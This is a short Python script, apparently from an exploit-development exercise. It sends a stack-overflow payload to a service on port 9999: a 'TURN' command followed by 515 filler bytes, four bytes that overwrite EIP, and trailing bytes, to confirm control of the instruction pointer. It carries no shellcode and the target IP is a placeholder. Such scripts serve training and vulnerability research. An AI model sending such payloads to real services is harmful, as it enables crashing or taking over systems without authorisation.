#!/usr/bin/env python3
import socket

IP = "000.000.0.00" 
PORT = 9999
PREFIX = "TURN /.:/"

offset = 515
buffer = "A" * offset      # Fills stack up to EIP
eip = "B" * 4              # Overwrites EIP target (0x42424242)
esp_test = "C" * 100       # Trailing buffer into ESP (0x43434343)

payload = PREFIX + buffer + eip + esp_test

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((IP, PORT))
        print("[*] Sending verification buffer...")
        s.send(bytes(payload, "latin-1"))
        print("[+] Check your debugger. EIP should be 42424242.")
except socket.error:
    print("[-] Target is unreachable.")

